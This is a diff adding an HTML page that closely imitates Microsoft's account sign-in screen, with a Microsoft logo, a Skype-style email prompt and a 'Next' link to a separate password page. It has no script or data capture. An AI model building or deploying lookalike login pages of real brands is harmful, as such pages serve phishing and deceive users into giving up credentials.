@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,">
+    <title>Sign In</title>
+	<style>
+		body {
+			 background-image: linear-gradient(to left, rgb(252, 237, 240) 10%, rgb(240, 240, 253) 20%);
+			font-family: Arial, sans-serif;
+			margin: 0;
+			padding: 0%;
+		}
+		.profile-image-wrapper {
+			position: relative; top: 10px;
+		}
+		.content-wrapper{
+			background-color: #ffffff;
+			text-align: left;
+			border: 1px solid #ccc;
+			border-radius: 1px;
+			box-shadow: 0 4px 4px rgba(0, 0, 0, 0.1);
+			margin: 100px auto;
+			max-width: 450px;
+			padding: 32px -10px;
+			text-indent: 6.5%;
+		}
+		.sio {
+			background-color: #ffffff;
+			border: 2px solid #ccc;
+			margin: 100px auto;
+			max-width: 430px;
+			padding: 8px 12px;
+			text-indent: 9%;
+			height: 30px;
+			position: relative; bottom: 75px;
+		}
+		.sio:hover {
+			background-color: #e0e0e0;
+		}
+		.si {
+			text-indent: 10%;
+			font-size: 150%;
+			color: rgb(51, 51, 51);
+			position: relative; bottom: 0px;
+		}
+
+		.container {
+			background-color: #ffffff;
+			text-align: left;
+			text-indent: 10%;
+			font-size: 22px;
+			margin-bottom: 10%;
+			position: relative; bottom: 10px ;
+		}
+
+		input[type=email]:focus {
+			outline: 3px solid transparent;
+
+		}
+
+		input[type="email"] {
+			background-color: #ffffff;
+			text-decoration: none;
+			border-top: #ffffff;
+			border-left: #ffffff;
+			border-right: #ffffff;
+			border-radius: 3px;
+			box-sizing: 30px;
+			display: block;
+			margin-bottom: 20px;
+			padding: 10px;
+			width: 85%;
+			font-size: 70%;
+			margin-left: 8%;
+		}
+		.NA {
+			font-size: 60%;
+			margin-left: .2%;
+		}
+		.NA a{
+			color: #1a5bdd;
+			text-decoration: none;
+		}
+		.NA a:hover {
+			color: #444343;
+			text-decoration: underline;
+		}
+		.ca a{
+			font-size: 60%;
+			color: #1a5bdd;
+			text-decoration: none;
+			margin-left: .2%;
+		}
+		.ca a:hover {
+			color: #444343;
+			text-decoration: underline;
+		}
+
+		.back {
+			background-color: #c9c5c5;
+			color: black;
+			margin-left: 48%;
+			margin-bottom: 10%;
+			padding: 8px 32px;
+			text-decoration: none;
+			font-size: 70%;
+			}
+		.back:hover {
+			background-color: #b3aeae;
+		}
+		.next{
+			background-color: #0067B8;
+			color: rgb(228, 228, 238);
+			text-decoration: none;
+			text-align: right;
+			margin-top: 0%;
+			font-size: 70%;
+			padding: 8px 36px;
+		}
+		.next:hover{
+			background-color: #025ba0;
+		}
+		.key {
+			position: relative; top: 2px;
+			text-align: center;
+		}
+
+		.sio a{
+			text-decoration: none;
+			color: rgb(46, 41, 41); left: 18px;
+			text-align: center;
+			position: relative; bottom: 5px;
+		}
+	</style>
+<body>
+  <div class="content-wrapper">
+    <div class="two-column-wrapper">
+        <div class="profile-image-wrapper">
+            <img src="Images\MicrosoftLogoP.svg" width="30%" alt="img">
+		</div>
+		<div class="si"><b> Sign in </b></p></div>
+	<div class="container">
+		<form>
+			<input type="email" class="rtb" id="username" name="username" width="20px" placeholder="Email address, phone number or Skype" required>
+			<nav class="NA">No account? <a href="#" class="noaccount">Create one!</a></nav>
+			<p class="ca"><a href="#">Can't access your account?</a></p>
+					<a href="#" class="back">Back</a>
+					<a href="password.html" class="next">Next</a>
+					</div>
+					</div>
+		</form>
+	</div>
+	<div class="sio">
+			<span class="key"><img src="Images\Gkey2.png" width="25" alt="Image"></span>
+				<a href="#">Sign-in options</a>
+		</div>
+	</div>
+</body>
+</head>
+</html>
